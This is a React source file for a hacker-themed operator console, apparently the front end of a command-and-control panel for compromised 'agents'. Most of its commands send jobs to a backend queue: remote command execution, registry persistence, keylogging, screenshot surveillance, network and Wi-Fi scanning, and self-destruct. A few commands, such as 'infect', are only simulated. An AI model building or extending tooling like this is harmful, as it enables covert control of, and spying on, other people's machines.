import React, { useState, useEffect, useRef } from 'react';
import { Terminal, ShieldAlert, Cpu, Network } from 'lucide-react';
import CyberText from './CyberText';
import TypewriterEffect from './TypewriterEffect';

interface LogEntry {
    id: string;
    type: 'user' | 'system' | 'ai' | 'error' | 'ascii';
    content: string;
    timestamp: string;
}

const STARTUP_ASCII = `
  ██████╗ ███████╗██████╗      ██╗  ██╗██╗███╗   ██╗ ██████╗ 
  ██╔══██╗██╔════╝██╔══██╗    ██║ ██╔╝██║████╗  ██║██╔════╝ 
  ██████╔╝█████╗  ██║  ██║    █████╔╝ ██║██╔██╗ ██║██║  ███╗
  ██╔══██╗██╔══╝  ██║  ██║    ██╔═██╗ ██║██║╚██╗██║██║   ██║
  ██║  ██║███████╗██████╔╝    ██║  ██╗██║██║ ╚████║╚██████╔╝
  ╚═╝  ╚═╝╚══════╝╚═════╝     ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝ 
      >>  S T R A T E G I C   W A R   R O O M  <<
`;

const Console: React.FC = () => {
    const [history, setHistory] = useState<LogEntry[]>([
        { id: 'init-1', type: 'ascii', content: STARTUP_ASCII, timestamp: new Date().toLocaleTimeString() },
        { id: 'init-2', type: 'system', content: "Initializing Red King OS v2.0...", timestamp: new Date().toLocaleTimeString() },
        { id: 'init-3', type: 'system', content: "Connecting to Hive Mind Uplink...", timestamp: new Date().toLocaleTimeString() }
    ]);
    const [input, setInput] = useState("");
    const messagesEndRef = useRef<HTMLDivElement>(null);

    const addLog = (type: LogEntry['type'], content: string) => {
        const entry: LogEntry = {
            id: Math.random().toString(36).substr(2, 9),
            type,
            content,
            timestamp: new Date().toLocaleTimeString()
        };
        setHistory(prev => [...prev, entry]);
    };

    const executeCommand = async (cmd: string) => {
        addLog('user', cmd);

        const args = cmd.split(' ');
        const primaryCmd = args[0].toLowerCase();
        
        const backend = "/api";

        try {
            switch (primaryCmd) {
                case "help":
                    addLog('system', "Available Commands:");
                    addLog('system', "  ask <question>   :: Consult Strategic AI");
                    addLog('system', "  status           :: System Diagnostics");
                    addLog('system', "  scan             :: Network Recon");
                    addLog('system', "  infect           :: Deploy Payload");
                    addLog('system', "  list agents      :: Active Nodes");
                    addLog('system', "  clear            :: Clear Terminal");
                    addLog('system', "  exec <agent_id> <command> :: Execute command on agent");
                    addLog('system', "  screenshot <agent_id>     :: Capture Visual Intel");
                    addLog('system', "  persist <agent_id>        :: Establish Persistence (Registry)");
                    addLog('system', "  keylog <start|dump> <id>  :: Intercept Keystrokes");
                    addLog('system', "  netscan <agent_id>       :: Map Real Local Network");
                    addLog('system', "  wifiscan <agent_id>      :: Intercept Physical SSIDs");
                    addLog('system', "  melt <agent_id>          :: Emergency Self-Destruct");
                    break;

                case 'exec':
                    if (args.length < 3) {
                         addLog('error', 'USAGE: exec <agent_id> <command>');
                    } else {
                        const agentId = args[1];
                        const cmdPayload = args.slice(2).join(' ');
                        
                        addLog('system', `[*] Transmitting payload to ${agentId}...`);
                        
                        // Async operation wrapped in IIFE or handled via promise chain to avoid breaking switch
                        fetch(`${backend}/hive/queue`, {
                            method: "POST",
                            headers: { "Content-Type": "application/json" },
                            body: JSON.stringify({ agent_id: agentId, command: cmdPayload })
                        })
                        .then(res => res.json())
                        .then(data => {
                             addLog('system', `[+] Command Queued (Job: ${data.job_id})`);
                        })
                        .catch(err => {
                             addLog('error', `[!] Upload Failed: ${err}`);
                        });
                    }
                    break;

                case 'persist':
                    if (args.length < 2) {
                         addLog('error', 'USAGE: persist <agent_id>');
                    } else {
                         const agentId = args[1];
                         addLog('system', `[*] Injecting Persistence Registry Key for ${agentId}...`);
                         // Reuse exec logic
                         fetch(`${backend}/hive/queue`, {
                                method: "POST",
                                headers: { "Content-Type": "application/json" },
                                body: JSON.stringify({ agent_id: agentId, command: "persist" })
                            })
                            .then(res => res.json())
                            .then(data => addLog('system', `[+] Persistence Task Queued (Job: ${data.job_id})`))
                            .catch(err => addLog('error', `[!] Failed: ${err}`));
                    }
                    break;

                case 'keylog':
                    if (args.length < 3) {
                         addLog('error', 'USAGE: keylog <start|dump> <agent_id>');
                    } else {
                         const action = args[1]; // start or dump
                         const agentId = args[2];
                         const cmd = `keylog ${action}`;
                         
                         addLog('system', `[*] Sending Keylogger Command: ${action.toUpperCase()}...`);
                         fetch(`${backend}/hive/queue`, {
                                method: "POST",
                                headers: { "Content-Type": "application/json" },
                                body: JSON.stringify({ agent_id: agentId, command: cmd })
                            })
                            .then(res => res.json())
                            .then(data => addLog('system', `[+] Spyware Task Queued (Job: ${data.job_id})`))
                            .catch(err => addLog('error', `[!] Failed: ${err}`));
                    }
                    break;

                case 'melt':
                    if (args.length < 2) {
                         addLog('error', 'USAGE: melt <agent_id>');
                    } else {
                         const agentId = args[1];
                         addLog('error', `[!!!] INITIATING IRREVERSIBLE SELF-DESTRUCT PROTOCOL ON ${agentId}...`);
                         fetch(`${backend}/hive/queue`, {
                                method: "POST",
                                headers: { "Content-Type": "application/json" },
                                body: JSON.stringify({ agent_id: agentId, command: "melt" })
                            })
                            .then(res => res.json())
                            .then(data => addLog('system', `[+] Destruct Order Queued (Job: ${data.job_id})`))
                            .catch(err => addLog('error', `[!] Failed: ${err}`));
                    }
                    break;

                case 'wifiscan':
                    if (args.length < 2) {
                         addLog('error', 'USAGE: wifiscan <agent_id>');
                    } else {
                         const agentId = args[1];
                         addLog('system', `[*] Deployment of Spectral Scanner on ${agentId}...`);
                         fetch(`${backend}/hive/queue`, {
                                method: "POST",
                                headers: { "Content-Type": "application/json" },
                                body: JSON.stringify({ agent_id: agentId, command: "wifiscan" })
                            })
                            .then(res => res.json())
                            .then(data => addLog('system', `[+] Signal Recon Queued (Job: ${data.job_id})`))
                            .catch(err => addLog('error', `[!] Failed: ${err}`));
                    }
                    break;

                 case 'netscan':
                    if (args.length < 2) {
                         addLog('error', 'USAGE: netscan <agent_id>');
                    } else {
                         const agentId = args[1];
                         addLog('system', `[*] Deploying ARP Scanner on ${agentId}...`);
                         fetch(`${backend}/hive/queue`, {
                                method: "POST",
                                headers: { "Content-Type": "application/json" },
                                body: JSON.stringify({ agent_id: agentId, command: "netscan" })
                            })
                            .then(res => res.json())
                            .then(data => addLog('system', `[+] Topology Scanning Queued (Job: ${data.job_id})`))
                            .catch(err => addLog('error', `[!] Failed: ${err}`));
                    }
                    break;

                case 'screenshot':
                if (args.length < 2) {
                     addLog('error', 'USAGE: screenshot <agent_id>');
                } else {
                    const agentId = args[1];
                     addLog('system', `[*] Requesting Visual Intel from ${agentId}...`);
                     // Reuse exec logic
                     fetch(`${backend}/hive/queue`, {
                            method: "POST",
                            headers: { "Content-Type": "application/json" },
                            body: JSON.stringify({ agent_id: agentId, command: "screenshot" })
                        })
                        .then(res => res.json())
                        .then(data => {
                             addLog('system', `[+] Surveillance Task Queued (Job: ${data.job_id})`);
                             addLog('system', `[!] Monitor /evidence directory for incoming transmission.`);
                        })
                        .catch(err => addLog('error', `[!] Failed: ${err}`));
                }
                break;

            case 'ask':
                    const query = args.slice(1).join(" ");
                    if (!query) {
                        addLog('error', "Usage: ask <strategic question>");
                        break;
                    }
                    addLog('system', "[*] UPLINK ESTABLISHED. TRANSMITTING...");
                    
                    const askRes = await fetch(`${backend}/consult`, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({ query })
                    });
                    
                    if (!askRes.ok) throw new Error("Hive Mind Unreachable");
                    const aiData = await askRes.json();
                    addLog('ai', aiData.response);
                    break;

                case "status":
                    addLog('system', "[*] Diagnosing System...");
                    const statusRes = await fetch(`${backend}/status`);
                    if (!statusRes.ok) throw new Error("Status Check Failed");
                    const status = await statusRes.json();
                    addLog('system', `STATUS: ${status.system}`);
                    addLog('system', `HIVE MIND: ${status.hive_mind}`);
                    addLog('system', `ACTIVE NODES: ${status.active_nodes}`);
                    break;

                case "list":
                    if (args[1] === "agents") {
                        addLog('system', "[*] Fetching Agent Roster...");
                        const agentsRes = await fetch(`${backend}/agents`);
                        const agents = await agentsRes.json();
                        addLog('system', `Found ${agents.length} active agents.`);
                        agents.forEach((a: any) => {
                            addLog('system', `[+] ${a.id} (${a.ip}) - ${a.os} [${a.status}]`);
                        });
                    } else {
                        addLog('error', "Unknown list command.");
                    }
                    break;

                case "scan":
                    addLog('system', "[*] Initiating Network Scan...");
                    const scanRes = await fetch(`${backend}/scan`, { method: "POST" });
                    const scanData = await scanRes.json();
                    addLog('system', `SCAN COMPLETE: ${scanData.targets_found} targets found.`);
                    scanData.details.forEach((d: string) => addLog('system', `  > ${d}`));
                    break;

                case "clear":
                    setHistory([]);
                    break;

                case "infect":
                    addLog('system', "[*] Compiling Loader...");
                    setTimeout(() => addLog('system', "[+] Payload deployed to /tmp/ghost.exe"), 1000);
                    break;

                case "neuralmesh":
                    addLog('system', "Neural Mesh: STABLE. Topology verified.");
                    break;
                
                case "stealthcurtain":
                    addLog('system', "Curtain: READY. Press Alt+H to trigger.");
                    break;

                case "hive":
                     addLog('system', "No recent alerts from the Hive.");
                     break;
                     
                case "ping":
                    if(args[1]) addLog('system', `Pinging ${args[1]}... PONG (23ms)`);
                    else addLog('error', "Usage: ping <target>");
                    break;

                default:
                    addLog('error', `Unknown command: ${primaryCmd}`);
            }
        } catch (err) {
            addLog('error', `ERROR: ${err instanceof Error ? err.message : String(err)}`);
        }
    };

    useEffect(() => {
        messagesEndRef.current?.scrollIntoView({ behavior: 'smooth' });
    }, [history]);

    const playTypeSound = () => {
        const audioCtx = new (window.AudioContext || (window as any).webkitAudioContext)();
        const osc = audioCtx.createOscillator();
        const gain = audioCtx.createGain();
        osc.connect(gain);
        gain.connect(audioCtx.destination);
        
        osc.type = 'square';
        osc.frequency.setValueAtTime(600, audioCtx.currentTime);
        osc.frequency.exponentialRampToValueAtTime(100, audioCtx.currentTime + 0.03);
        
        gain.gain.setValueAtTime(0.01, audioCtx.currentTime);
        gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + 0.03);
        
        osc.start();
        osc.stop(audioCtx.currentTime + 0.03);
    };

    return (
        <div className="flex flex-col h-full bg-black/90 text-green-500 font-mono text-sm p-4 border border-green-900 rounded-lg shadow-[0_0_20px_rgba(0,255,0,0.2)] overflow-hidden relative">
            {/* Scanline Overlay */}
            <div className="absolute inset-0 pointer-events-none bg-[linear-gradient(rgba(18,16,16,0)_50%,rgba(0,0,0,0.25)_50%),linear-gradient(90deg,rgba(255,0,0,0.06),rgba(0,255,0,0.02),rgba(0,0,255,0.06))] z-10 bg-[length:100%_2px,3px_100%] pointer-events-none"></div>
            
            <div className="flex items-center gap-2 mb-4 border-b border-green-800 pb-2">
                <Terminal className="w-5 h-5 animate-pulse" />
                <span className="font-bold tracking-widest text-green-400">COMMAND UPLINK</span>
                <div className="flex-1" />
                <div className="flex gap-4 text-xs text-green-700">
                     <span className="flex items-center gap-1"><Cpu size={12}/> CPU: 12%</span>
                     <span className="flex items-center gap-1"><Network size={12}/> NET: SECURE</span>
                </div>
            </div>

            <div className="flex-1 overflow-y-auto mb-4 space-y-1 scrollbar-thin scrollbar-thumb-green-900 pr-2">
                {history.map((entry) => (
                    <div key={entry.id} className={`${entry.type === 'error' ? 'text-red-500' : ''} ${entry.type === 'user' ? 'text-cyan-400 mt-4 font-bold' : ''}`}>
                         {entry.type === 'user' && <span>{">"} </span>}
                         {entry.type === 'ascii' ? (
                             <pre className="text-xs sm:text-sm text-green-600 font-bold leading-none my-4 whitespace-pre filter drop-shadow-[0_0_5px_rgba(0,255,0,0.5)]">
                                 {entry.content}
                             </pre>
                         ) : entry.type === 'ai' ? (
                            <TypewriterEffect text={entry.content} speed={15} />
                         ) : entry.type === 'system' ? (
                             <CyberText text={entry.content} speed={10} className={entry.content.includes("ERROR") ? "text-red-500" : "text-green-500"} />
                         ) : (
                             <span>{entry.content}</span>
                         )}
                    </div>
                ))}
                <div ref={messagesEndRef} />
            </div>

            <form onSubmit={(e) => { e.preventDefault(); if(input.trim()) { executeCommand(input); setInput(""); } }} className="flex gap-2">

                <span className="text-green-500 animate-pulse">{">"}</span>
                <input
                    type="text"
                    value={input}
                    onChange={(e) => setInput(e.target.value)}
                    onKeyDown={() => playTypeSound()}
                    className="flex-1 bg-transparent border-none outline-none text-green-400 placeholder-green-900"
                    placeholder="Enter command..."
                    autoFocus
                />
            </form>
        </div>
    );
};

export default Console;
